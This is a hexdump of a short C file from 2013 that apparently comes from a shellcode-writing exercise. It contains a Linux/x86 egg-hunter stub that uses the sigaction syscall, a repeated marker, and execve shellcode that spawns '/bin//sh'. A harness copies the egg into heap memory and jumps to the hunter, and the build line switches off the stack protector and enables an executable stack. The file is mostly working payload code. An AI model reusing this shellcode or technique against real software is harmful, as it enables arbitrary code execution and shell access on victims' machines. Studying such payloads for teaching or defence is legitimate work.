00000000  2f 2a 0a 54 69 74 6c 65  20 20 20 3a 20 65 67 67  |/*.Title   : egg|
00000010  68 75 6e 74 65 72 20 73  68 65 6c 6c 63 6f 64 65  |hunter shellcode|
00000020  0a 20 20 20 20 20 20 20  20 3a 20 68 75 6e 74 65  |.        : hunte|
00000030  72 20 28 33 30 20 62 79  74 65 73 29 2c 20 6d 61  |r (30 bytes), ma|
00000040  72 6b 65 72 20 28 38 20  62 79 74 65 73 29 2c 20  |rker (8 bytes), |
00000050  73 68 65 6c 6c 63 6f 64  65 20 28 32 38 20 62 79  |shellcode (28 by|
00000060  74 65 73 29 0a 44 61 74  65 20 20 20 20 3a 20 32  |tes).Date    : 2|
00000070  38 20 4d 61 79 20 32 30  31 33 0a 41 75 74 68 6f  |8 May 2013.Autho|
00000080  72 20 20 3a 20 52 75 73  73 65 6c 6c 20 57 69 6c  |r  : Russell Wil|
00000090  6c 69 73 20 3c 63 6f 64  69 6e 67 75 79 40 67 6d  |lis <codinguy@gm|
000000a0  61 69 6c 2e 63 6f 6d 3e  0a 54 65 73 74 64 20 6f  |ail.com>.Testd o|
000000b0  6e 3a 20 4c 69 6e 75 78  2f 78 38 36 20 28 53 4d  |n: Linux/x86 (SM|
000000c0  50 20 44 65 62 69 61 6e  20 33 2e 32 2e 34 31 2d  |P Debian 3.2.41-|
000000d0  32 20 69 36 38 36 29 0a  0a 43 6f 6d 6d 65 6e 74  |2 i686)..Comment|
000000e0  73 3a 0a 20 20 20 20 55  73 69 6e 67 20 73 69 67  |s:.    Using sig|
000000f0  61 63 74 69 6f 6e 20 73  79 73 74 65 6d 20 63 61  |action system ca|
00000100  6c 6c 20 66 6f 72 20 68  75 6e 74 65 72 20 63 6f  |ll for hunter co|
00000110  64 65 20 66 6f 72 20 72  6f 62 75 73 74 20 6f 70  |de for robust op|
00000120  65 72 61 74 69 6f 6e 2e  0a 20 20 20 20 42 61 73  |eration..    Bas|
00000130  65 64 20 6f 6e 20 70 61  70 65 72 20 27 53 61 66  |ed on paper 'Saf|
00000140  65 6c 79 20 53 65 61 72  63 68 69 6e 67 20 50 72  |ely Searching Pr|
00000150  6f 63 65 73 73 20 56 69  72 74 75 61 6c 20 41 64  |ocess Virtual Ad|
00000160  64 72 65 73 73 20 53 70  61 63 65 27 2e 0a 20 20  |dress Space'..  |
00000170  20 20 54 68 69 73 20 69  73 20 61 20 6d 75 73 74  |  This is a must|
00000180  20 72 65 61 64 20 70 61  70 65 72 2c 20 69 6e 73  | read paper, ins|
00000190  74 72 75 63 74 69 76 65  20 61 6e 64 20 69 6e 73  |tructive and ins|
000001a0  70 69 72 69 6e 67 2c 20  66 6f 75 6e 64 20 68 65  |piring, found he|
000001b0  72 65 3a 0a 20 20 20 20  68 74 74 70 3a 2f 2f 77  |re:.    http://w|
000001c0  77 77 2e 68 69 63 6b 2e  6f 72 67 2f 63 6f 64 65  |ww.hick.org/code|
000001d0  2f 73 6b 61 70 65 2f 70  61 70 65 72 73 2f 65 67  |/skape/papers/eg|
000001e0  67 68 75 6e 74 2d 73 68  65 6c 6c 63 6f 64 65 2e  |ghunt-shellcode.|
000001f0  70 64 66 0a 20 20 20 20  73 65 65 20 73 65 63 74  |pdf.    see sect|
00000200  69 6f 6e 20 33 2e 31 2e  33 20 73 69 67 61 63 74  |ion 3.1.3 sigact|
00000210  69 6f 6e 28 32 29 2c 20  70 61 67 65 20 31 33 2e  |ion(2), page 13.|
00000220  0a 20 20 20 20 0a 20 20  20 20 54 6f 20 62 75 69  |.    .    To bui|
00000230  6c 64 3a 0a 20 20 20 20  67 63 63 20 2d 66 6e 6f  |ld:.    gcc -fno|
00000240  2d 73 74 61 63 6b 2d 70  72 6f 74 65 63 74 6f 72  |-stack-protector|
00000250  20 2d 7a 20 65 78 65 63  73 74 61 63 6b 20 65 67  | -z execstack eg|
00000260  67 68 75 6e 74 65 72 2e  63 20 2d 6f 20 65 67 67  |ghunter.c -o egg|
00000270  68 75 6e 74 65 72 0a 2a  2f 0a 0a 23 69 6e 63 6c  |hunter.*/..#incl|
00000280  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0a 23 69  |ude <stdio.h>.#i|
00000290  6e 63 6c 75 64 65 20 3c  73 74 72 69 6e 67 2e 68  |nclude <string.h|
000002a0  3e 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 6c  |>.#include <stdl|
000002b0  69 62 2e 68 3e 0a 0a 2f  2a 0a 20 2a 20 4d 61 72  |ib.h>../*. * Mar|
000002c0  6b 65 72 20 63 6f 64 65  20 6d 75 73 74 20 62 65  |ker code must be|
000002d0  20 65 78 65 63 75 74 61  62 6c 65 2c 20 63 75 72  | executable, cur|
000002e0  72 65 6e 74 6c 79 3a 0a  20 2a 20 20 20 2f 78 39  |rently:. *   /x9|
000002f0  30 20 6e 6f 70 0a 20 2a  20 20 20 2f 78 35 30 20  |0 nop. *   /x50 |
00000300  70 75 73 68 20 65 61 78  0a 20 2a 2f 20 0a 23 64  |push eax. */ .#d|
00000310  65 66 69 6e 65 20 4d 41  52 4b 45 52 20 22 5c 78  |efine MARKER "\x|
00000320  39 30 5c 78 35 30 22 20  0a 0a 63 68 61 72 20 68  |90\x50" ..char h|
00000330  75 6e 74 65 72 5b 5d 20  3d 20 0a 20 20 20 20 22  |unter[] = .    "|
00000340  5c 78 36 36 5c 78 38 31  5c 78 63 39 5c 78 66 66  |\x66\x81\xc9\xff|
00000350  5c 78 30 66 5c 78 34 31  5c 78 36 61 5c 78 34 33  |\x0f\x41\x6a\x43|
00000360  5c 78 35 38 5c 78 63 64  5c 78 38 30 5c 78 33 63  |\x58\xcd\x80\x3c|
00000370  5c 78 66 32 5c 78 37 34  5c 78 66 31 22 0a 20 20  |\xf2\x74\xf1".  |
00000380  20 20 22 5c 78 62 38 22  4d 41 52 4b 45 52 22 22  |  "\xb8"MARKER""|
00000390  4d 41 52 4b 45 52 22 5c  78 38 39 5c 78 63 66 5c  |MARKER"\x89\xcf\|
000003a0  78 61 66 5c 78 37 35 5c  78 65 63 5c 78 61 66 5c  |xaf\x75\xec\xaf\|
000003b0  78 37 35 5c 78 65 39 5c  78 66 66 5c 78 65 37 22  |x75\xe9\xff\xe7"|
000003c0  3b 0a 63 68 61 72 20 6d  61 72 6b 65 72 5b 5d 20  |;.char marker[] |
000003d0  3d 20 4d 41 52 4b 45 52  3b 20 0a 63 68 61 72 20  |= MARKER; .char |
000003e0  73 68 65 6c 6c 63 6f 64  65 5b 5d 20 3d 20 0a 20  |shellcode[] = . |
000003f0  20 20 20 22 5c 78 33 31  5c 78 63 30 5c 78 33 31  |   "\x31\xc0\x31|
00000400  5c 78 64 32 5c 78 35 32  5c 78 36 38 5c 78 36 65  |\xd2\x52\x68\x6e|
00000410  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 36 38  |\x2f\x73\x68\x68|
00000420  5c 78 32 66 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\x2f\x2f\x62\x69|
00000430  22 0a 20 20 20 20 22 5c  78 38 39 5c 78 65 33 5c  |".    "\x89\xe3\|
00000440  78 35 32 5c 78 35 33 5c  78 38 39 5c 78 65 31 5c  |x52\x53\x89\xe1\|
00000450  78 35 32 5c 78 38 39 5c  78 65 32 5c 78 62 30 5c  |x52\x89\xe2\xb0\|
00000460  78 30 62 5c 78 63 64 5c  78 38 30 22 3b 0a 20 0a  |x0b\xcd\x80";. .|
00000470  69 6e 74 20 0a 6d 61 69  6e 28 76 6f 69 64 29 20  |int .main(void) |
00000480  0a 7b 0a 20 20 20 20 69  6e 74 20 69 3d 30 2c 20  |.{.    int i=0, |
00000490  6e 6d 61 72 6b 65 72 73  20 3d 20 34 2c 20 6d 61  |nmarkers = 4, ma|
000004a0  72 6b 65 72 6c 65 6e 20  3d 20 73 69 7a 65 6f 66  |rkerlen = sizeof|
000004b0  28 6d 61 72 6b 65 72 29  2d 31 3b 0a 20 20 20 20  |(marker)-1;.    |
000004c0  2f 2a 20 0a 20 20 20 20  20 2a 20 53 65 74 75 70  |/* .     * Setup|
000004d0  20 61 72 65 61 20 6f 66  20 6d 65 6d 6f 72 79 20  | area of memory |
000004e0  66 6f 72 20 74 65 73 74  69 6e 67 2c 0a 20 20 20  |for testing,.   |
000004f0  20 20 2a 20 70 6c 61 63  65 20 6d 61 72 6b 65 72  |  * place marker|
00000500  20 61 6e 64 20 73 68 65  6c 6c 63 6f 64 65 20 69  | and shellcode i|
00000510  6e 74 6f 20 61 72 65 61  2e 0a 20 20 20 20 20 2a  |nto area..     *|
00000520  2f 20 0a 20 20 20 20 63  68 61 72 20 2a 65 67 67  |/ .    char *egg|
00000530  20 3d 20 6d 61 6c 6c 6f  63 28 31 32 38 29 3b 0a  | = malloc(128);.|
00000540  20 20 20 20 6d 65 6d 63  70 79 28 65 67 67 2b 28  |    memcpy(egg+(|
00000550  6d 61 72 6b 65 72 6c 65  6e 2a 6e 6d 61 72 6b 65  |markerlen*nmarke|
00000560  72 73 29 2c 20 73 68 65  6c 6c 63 6f 64 65 2c 20  |rs), shellcode, |
00000570  73 69 7a 65 6f 66 28 73  68 65 6c 6c 63 6f 64 65  |sizeof(shellcode|
00000580  29 2d 31 29 3b 0a 20 20  20 20 64 6f 20 7b 0a 20  |)-1);.    do {. |
00000590  20 20 20 20 20 6d 65 6d  63 70 79 28 65 67 67 2b  |     memcpy(egg+|
000005a0  69 2c 20 6d 61 72 6b 65  72 2c 20 6d 61 72 6b 65  |i, marker, marke|
000005b0  72 6c 65 6e 29 3b 0a 20  20 20 20 20 20 69 20 2b  |rlen);.      i +|
000005c0  3d 20 6d 61 72 6b 65 72  6c 65 6e 3b 0a 20 20 20  |= markerlen;.   |
000005d0  20 7d 20 77 68 69 6c 65  28 69 20 21 3d 20 28 6d  | } while(i != (m|
000005e0  61 72 6b 65 72 6c 65 6e  20 2a 20 6e 6d 61 72 6b  |arkerlen * nmark|
000005f0  65 72 73 29 29 3b 0a 20  20 20 20 2f 2a 0a 20 20  |ers));.    /*.  |
00000600  20 20 20 2a 20 52 75 6e  20 68 75 6e 74 65 72 20  |   * Run hunter |
00000610  74 6f 20 73 65 61 72 63  68 20 66 6f 72 20 6d 61  |to search for ma|
00000620  72 6b 65 72 20 61 6e 64  20 6a 75 6d 70 20 74 6f  |rker and jump to|
00000630  20 73 68 65 6c 6c 63 6f  64 65 20 0a 20 20 20 20  | shellcode .    |
00000640  20 2a 2f 0a 20 20 20 20  69 6e 74 20 28 2a 72 65  | */.    int (*re|
00000650  74 29 28 29 20 3d 20 28  69 6e 74 28 2a 29 28 29  |t)() = (int(*)()|
00000660  29 68 75 6e 74 65 72 3b  0a 20 20 20 20 72 65 74  |)hunter;.    ret|
00000670  28 29 3b 0a 20 20 20 20  66 72 65 65 28 65 67 67  |();.    free(egg|
00000680  29 3b 0a 20 20 20 20 72  65 74 75 72 6e 20 30 3b  |);.    return 0;|
00000690  0a 7d                                             |.}|
00000692
